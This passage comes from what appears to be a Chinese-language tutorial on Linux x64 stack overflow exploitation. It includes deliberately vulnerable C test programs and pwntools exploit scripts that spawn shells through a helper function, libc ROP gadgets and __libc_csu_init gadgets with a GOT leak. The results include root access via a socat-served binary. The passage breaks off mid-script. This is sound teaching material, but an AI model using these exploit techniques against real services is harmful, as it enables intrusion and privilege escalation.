class="line">linux_x64_test1`vulnerable_function:</span><br><span class="line">-&gt;  0x4005e7 &lt;+32&gt;: retq</span><br><span class="line"></span><br><span class="line">linux_x64_test1`main:</span><br><span class="line">    0x4005e8 &lt;+0&gt;:  pushq  %rbp</span><br><span class="line">    0x4005e9 &lt;+1&gt;:  movq   %rsp, %rbp</span><br><span class="line">    0x4005ec &lt;+4&gt;:  subq   <span class="variable">$0x10</span>, %rsp</span><br><span class="line">(lldb) x/xg <span class="variable">$rsp</span>  <span class="comment"># memory read --size 8 --format x --count 8 $rsp</span></span><br><span class="line"></span><br><span class="line">0x7fffffffdd58: 0x3765413665413565</span><br><span class="line"></span><br><span class="line">python2 pattern.py offset 0x3765413665413565</span><br><span class="line">hex pattern decoded as: e5Ae6Ae7</span><br><span class="line">136</span><br></pre></td></tr></table></figure>
<p>发现 溢出字符串长度为 136+ret_address</p>
<h4 id="获取-callsystem-函数地址"><a href="#获取-callsystem-函数地址" class="headerlink" title="获取 callsystem 函数地址"></a>获取 callsystem 函数地址</h4><p>因为代码中存在辅助函数callsystem，直接获取地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ nm linux_x64_test1|grep call</span><br><span class="line">00000000004005b6 T callsystem</span><br></pre></td></tr></table></figure>
<h4 id="编写并测试利用-提权"><a href="#编写并测试利用-提权" class="headerlink" title="编写并测试利用_提权"></a>编写并测试利用_提权</h4><p>pwntools是一个二进制利用框架，可以用python编写一些利用脚本，方便达到利用漏洞的目的，当然也可以用其他手段。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = pwn.process(<span class="string">"./linux_x64_test1"</span>)</span><br><span class="line"><span class="comment"># p = remote('172.16.36.174', 10002)</span></span><br><span class="line">callsystem_address = <span class="number">0x00000000004005b6</span></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">136</span> + pwn.p64(callsystem_address)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>测试利用拿到shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ python test.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;linux_x64_test1&#39;: pid 117455</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">panda</span><br></pre></td></tr></table></figure>
<p>将二进制程序设置为服务端程序,后续文章不再说明</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1</span><br></pre></td></tr></table></figure>
<p>测试远程程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ python test2.py </span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">panda</span><br></pre></td></tr></table></figure>
<p>如果这个进程是root</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo socat TCP4-LISTEN:10001,fork EXEC:.&#x2F;linux_x64_test1</span><br></pre></td></tr></table></figure>
<p>测试远程程序，提权成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ python test.py </span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="实践2-栈溢出-通过ROP绕过DEP和ASLR防护"><a href="#实践2-栈溢出-通过ROP绕过DEP和ASLR防护" class="headerlink" title="实践2_栈溢出_通过ROP绕过DEP和ASLR防护"></a>实践2_栈溢出_通过ROP绕过DEP和ASLR防护</h3><h4 id="编译测试用例-1"><a href="#编译测试用例-1" class="headerlink" title="编译测试用例"></a>编译测试用例</h4><p>开启ASLR后,libc地址会不断变化,这里先不讨论怎么获取真实system地址，用了一个辅助函数打印system地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* handle = dlopen(<span class="string">"libc.so.6"</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,dlsym(handle,<span class="string">"system"</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!bash</span></span><br><span class="line">gcc -fno-stack-protector linux_x64_test2.c -o linux_x64_test2 -ldl //禁用栈保护</span><br></pre></td></tr></table></figure>
<p>检测如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec linux_x64_test2</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
<p>观察ASLR，运行两次,发现每次libc的system函数地址会变化，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ .&#x2F;linux_x64_test2 </span><br><span class="line">0x7f9d7d71a390</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ .&#x2F;linux_x64_test2 </span><br><span class="line">0x7fa84dc3d390</span><br><span class="line">Hello, World</span><br></pre></td></tr></table></figure>
<h4 id="ROP简介"><a href="#ROP简介" class="headerlink" title="ROP简介"></a>ROP简介</h4><p>ROP的全称为Return-oriented programming（返回导向编程）,是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行DEP和代码签名等）</p>
<h4 id="寻找ROP"><a href="#寻找ROP" class="headerlink" title="寻找ROP"></a>寻找ROP</h4><p>我们希望最后执行system(“/bin/sh”)，缓冲区溢出后传入”/bin/sh”的地址和函数system地址。<br>我们想要的x64的gadget一般如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pop rdi  // rdi=<span class="string">"/bin/sh"</span></span><br><span class="line">ret      // call system_addr</span><br><span class="line"></span><br><span class="line">pop rdi  // rdi=<span class="string">"/bin/sh"</span></span><br><span class="line">pop rax  // rax= system_addr</span><br><span class="line">call rax // call system_addr</span><br></pre></td></tr></table></figure>
<p>系统开启了aslr，只能通过相对偏移来计算gadget，在二进制中搜索，这里用到工具<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ ROPgadget --binary linux_x64_test2 --only &quot;pop|sret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 0</span><br></pre></td></tr></table></figure>
<p>获取二进制的链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ ldd linux_x64_test2</span><br><span class="line">	linux-vdso.so.1 &#x3D;&gt;  (0x00007ffeae9ec000)</span><br><span class="line">	libdl.so.2 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl.so.2 (0x00007fdc0531f000)</span><br><span class="line">	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fdc04f55000)</span><br><span class="line">	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007fdc05523000)</span><br></pre></td></tr></table></figure>
<p>在库中搜索 pop ret</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ ROPgadget --binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 --only &quot;pop|ret&quot; |grep rdi</span><br><span class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000021102 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<p>决定用 0x0000000000021102<br>在库中搜索 /bin/sh 字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ ROPgadget --binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 --string &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x000000000018cd57 : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<h4 id="构造利用并测试"><a href="#构造利用并测试" class="headerlink" title="构造利用并测试"></a>构造利用并测试</h4><p>这里实现两种gadgets 实现利用目的，分别是version1和version2</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">libc = pwn.ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="comment"># p = pwn.process("./linux_x64_test2")</span></span><br><span class="line">p = pwn.remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">systema_addr_str = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">systema_addr = int(systema_addr_str,<span class="number">16</span>)  <span class="comment"># now system addr</span></span><br><span class="line"></span><br><span class="line">binsh_static = <span class="number">0x000000000018cd57</span></span><br><span class="line">binsh2_static = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"binsh_static   = 0x%x"</span> % binsh_static)</span><br><span class="line">print(<span class="string">"binsh2_static  = 0x%x"</span> % binsh2_static)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_offset = binsh2_static - libc.symbols[<span class="string">"system"</span>] <span class="comment"># offset = static1 - static2</span></span><br><span class="line">print(<span class="string">"binsh_offset   = 0x%x"</span> % binsh_offset)</span><br><span class="line"></span><br><span class="line">binsh_addr = binsh_offset + systema_addr</span><br><span class="line">print(<span class="string">"binsh_addr     = 0x%x"</span> % binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># version1</span></span><br><span class="line"><span class="comment"># pop_ret_static = 0x0000000000021102 # pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop_ret_offset = pop_ret_static - libc.symbols["system"]</span></span><br><span class="line"><span class="comment"># print("pop_ret_offset = 0x%x" % pop_ret_offset)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop_ret_addr = pop_ret_offset + systema_addr</span></span><br><span class="line"><span class="comment"># print("pop_ret_addr   = 0x%x" % pop_ret_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload="A"*136 +pwn.p64(pop_ret_addr)+pwn.p64(binsh_addr)+pwn.p64(systema_addr)</span></span><br><span class="line"><span class="comment"># binsh_addr      低   x64 第一个参数是rdi</span></span><br><span class="line"><span class="comment"># systema_addr    高</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># version2</span></span><br><span class="line">pop_pop_call_static = <span class="number">0x0000000000107419</span> <span class="comment">#  pop rax ; pop rdi ; call rax</span></span><br><span class="line">pop_pop_call_offset = pop_pop_call_static - libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print(<span class="string">"pop_pop_call_offset = 0x%x"</span> % pop_pop_call_offset)</span><br><span class="line"></span><br><span class="line">pop_pop_call_addr = pop_pop_call_offset + systema_addr</span><br><span class="line">print(<span class="string">"pop_pop_call_addr    = 0x%x"</span> % pop_pop_call_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">136</span> +pwn.p64(pop_pop_call_addr)+pwn.p64(systema_addr)+pwn.p64(binsh_addr)</span><br><span class="line"><span class="comment"># systema_addr      低   pop rax</span></span><br><span class="line"><span class="comment"># binsh_addr        高   pop rdi</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"\n##########sending payload##########\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最后测试如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/<span class="built_in">test</span>$ python test2.py </span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./linux_x64_test2'</span>: pid 118889</span><br><span class="line">binsh_static   = 0x18cd57</span><br><span class="line">binsh2_static  = 0x18cd57</span><br><span class="line">binsh_offset   = 0x1479c7</span><br><span class="line">binsh_addr     = 0x7fc3018ffd57</span><br><span class="line">pop_ret_offset = 0x-2428e</span><br><span class="line">pop_ret_addr   = 0x7fc301794102</span><br><span class="line"></span><br><span class="line"><span class="comment">##########sending payload##########</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">panda</span><br></pre></td></tr></table></figure>
<h3 id="实践3-栈溢出-去掉辅助函数"><a href="#实践3-栈溢出-去掉辅助函数" class="headerlink" title="实践3_栈溢出_去掉辅助函数"></a>实践3_栈溢出_去掉辅助函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector linux_x64_test3.c -o linux_x64_test3 -ldl //禁用栈保护</span><br></pre></td></tr></table></figure>
<p>检查防护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec linux_x64_test3</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br><span class="line">gdb-peda$ quit</span><br></pre></td></tr></table></figure>

<h4 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h4><p>相关概念：堆(heap)，栈(stack)，BSS段，数据段(data)，代码段(code /text)，全局静态区，文字常量区，程序代码区。<br>BSS段：BSS段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。<br>数据段：数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。<br>代码段：代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读, 某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。<br>堆（heap）：堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。<br>栈(stack)：栈又称堆栈，用户存放程序临时创建的局部变量。在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的后进先出特点，所以栈特别方便用来保存/恢复调用现场。<br>程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Type</th>
<th>Addr</th>
<th>Off</th>
<th>Size</th>
<th>ES</th>
<th>Flg</th>
<th>Lk</th>
<th>Inf</th>
<th>Al</th>
</tr>
</thead>
<tbody><tr>
<td>名字</td>
<td>类型</td>
<td>起始地址</td>
<td>文件的偏移地址</td>
<td>区大小</td>
<td>表区的大小</td>
<td>区标志</td>
<td>相关区索引</td>
<td>其他区信息</td>
<td>对齐字节数</td>
</tr>
<tr>
<td><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ readelf -S linux_x64_test3</span><br><span class="line">There are 31 section headers, starting at offset 0x1a48:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [24] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br><span class="line">  [25] .data             PROGBITS         0000000000601030  00001030</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [26] .bss              NOBITS           0000000000601040  00001040</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="寻找合适的gadget"><a href="#寻找合适的gadget" class="headerlink" title="寻找合适的gadget"></a>寻找合适的gadget</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/<span class="built_in">test</span>$ objdump -d linux_x64_test3</span><br><span class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005c0:	41 57                	push   %r15</span><br><span class="line">  4005c2:	41 56                	push   %r14</span><br><span class="line">  4005c4:	41 89 ff             	mov    %edi,%r15d</span><br><span class="line">  4005c7:	41 55                	push   %r13</span><br><span class="line">  4005c9:	41 54                	push   %r12</span><br><span class="line">  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        <span class="comment"># 600e10 &lt;__frame_dummy_init_array_entry&gt;</span></span><br><span class="line">  4005d2:	55                   	push   %rbp</span><br><span class="line">  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        <span class="comment"># 600e18 &lt;__init_array_end&gt;</span></span><br><span class="line">  4005da:	53                   	push   %rbx</span><br><span class="line">  4005db:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line">  4005de:	49 89 d5             	mov    %rdx,%r13</span><br><span class="line">  4005e1:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line">  4005e4:	48 83 ec 08          	sub    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">  4005e8:	48 c1 fd 03          	sar    <span class="variable">$0x3</span>,%rbp</span><br><span class="line">  4005ec:	e8 0f fe ff ff       	callq  400400 &lt;_init&gt;</span><br><span class="line">  4005f1:	48 85 ed             	<span class="built_in">test</span>   %rbp,%rbp</span><br><span class="line">  4005f4:	74 20                	je     400616 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005f6:	31 db                	xor    %ebx,%ebx</span><br><span class="line">  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:	00 </span><br><span class="line">  </span><br><span class="line">  400600:	4c 89 ea             	mov    %r13,%rdx</span><br><span class="line">  400603:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line">  400606:	44 89 ff             	mov    %r15d,%edi</span><br><span class="line">  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line">  40060d:	48 83 c3 01          	add    <span class="variable">$0x1</span>,%rbx</span><br><span class="line">  400611:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400614:	75 ea                	jne    400600 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400616:	48 83 c4 08          	add    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">  </span><br><span class="line">  40061a:	5b                   	pop    %rbx</span><br><span class="line">  40061b:	5d                   	pop    %rbp</span><br><span class="line">  40061c:	41 5c                	pop    %r12</span><br><span class="line">  40061e:	41 5d                	pop    %r13</span><br><span class="line">  400620:	41 5e                	pop    %r14</span><br><span class="line">  400622:	41 5f                	pop    %r15</span><br><span class="line">  400624:	c3                   	retq   </span><br><span class="line">  400625:	90                   	nop</span><br><span class="line">  400626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40062d:	00 00 00</span><br></pre></td></tr></table></figure>
<p>程序自己的 __libc_csu_init 函数，没开PIE.</p>
<p>疑问:</p>
<ol>
<li><p>这里可以直接write出got_system吗？ 既然都得到got_write这个是静态地址，还能去调用，难道got表函数随便调用不变？<br>got_system 存储了实际的 libc-2.23.so!write 地址，所以去执行 got_system 然后打印出实际地址<br><img src="https://i.loli.net/2020/05/20/tudFLS2mWTrqZDP.jpg" alt="-w973"></p>
</li>
<li><p>为什么不传递 “/bin/sh”的字符串地址到最后调用的system(“/bin/sh”),而是将”/bin/sh”写入 bss段<br>因为这里rdi=r15d=param1  r15d 32-bit 所以不能传递给rdi 64-bit的 “/bin/sh” 字符串地址，所以必须写入到可写bss段，因为程序段就32-bit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00007f76:f3c0bd57|2f 62 69 6e 2f 73 68 00 65                     |&#x2F;bin&#x2F;sh.e       |</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; &#x2F;dev&#x2F;stdin    fd&#x2F;0</span><br><span class="line">&#x2F;&#x2F; &#x2F;dev&#x2F;stdout   fd&#x2F;1</span><br><span class="line">&#x2F;&#x2F; &#x2F;dev&#x2F;stderr   fd&#x2F;2</span><br></pre></td></tr></table></figure>
<p>总结: </p>
<ol>
<li>返回到 0x40061a 控制 <code>rbx,rbp,r12,r13,r14,r15</code></li>
<li>返回到 0x400600 执行 <code>rdx=r13 rsi=r14 rdi=r15d call callq  *(%r12,%rbx,8)</code></li>
<li>使 rbx=0 这样最后就可以<code>callq *(r12+rbx*8)</code> = <code>callq *(r12)</code>  可以构造rop使之能执行任意函数</li>
<li>需要泄露真实 libc.so 在内存中的地址才能拿到system_addr,才能getshell,那么返回调用<code>got_write(rdi=1,rsi=got_write,rdx=8)</code>，从服务端返回write_addr，通过write_addr减去 - write_static/libc.symbols[‘write’]和system_static/libc.symbols[‘system’] 的差值得到 system_addr，然后返回到main重新开始，但并没有结束进程</li>
<li>返回调用got_read(rdi=0,bss_addr,16),相当于执行 <code>got_read(rdi=0,bss_addr,8)</code> ,<code>got_read(rdi=0,bss_addr+8,8)</code>,发送 system_addr,”/bin/sh”,然后返回到main重新开始，但并没有结束进程</li>
<li>返回到bss_addr(bss_addr+8)  -&gt;  system_addr(binsh_addr)</li>
</ol>
<h4 id="开始构造ROP"><a href="#开始构造ROP" class="headerlink" title="开始构造ROP"></a>开始构造ROP</h4><p>查看got表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ objdump -R linux_x64_test3</span><br><span class="line"></span><br><span class="line">linux_x64_test3:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
<p>然后利用代码如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc_elf = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">linux_x64_test3_elf = ELF(<span class="string">"./linux_x64_test3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./linux_x64_test3")</span></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x40061a</span></span><br><span class="line">print(<span class="string">"[+] pop_rbx_rbp_r12_r13_r14_r15_ret = 0x%x"</span> % pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">rdx_rsi_rdi_callr12_ret = <span class="number">0x400600</span></span><br><span class="line">print(<span class="string">"[+] rdx_rsi_rdi_callr12_ret = 0x%x"</span> %  rdx_rsi_rdi_callr12_ret)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">got_write =<span class="number">0x0000000000601018</span></span><br><span class="line">print(<span class="string">"[+] got_write = 0x%x"</span> % got_write)</span><br><span class="line"></span><br><span class="line">got_write2=linux_x64_test3_elf.got[<span class="string">"write"</span>]</span><br><span class="line">print(<span class="string">"[+] got_write2 = 0x%x"</span> %  got_write2)</span><br><span class="line"></span><br><span class="line">got_read = <span class="number">0x0000000000601020</span></span><br><span class="line">got_read2=linux_x64_test3_elf.got[<span 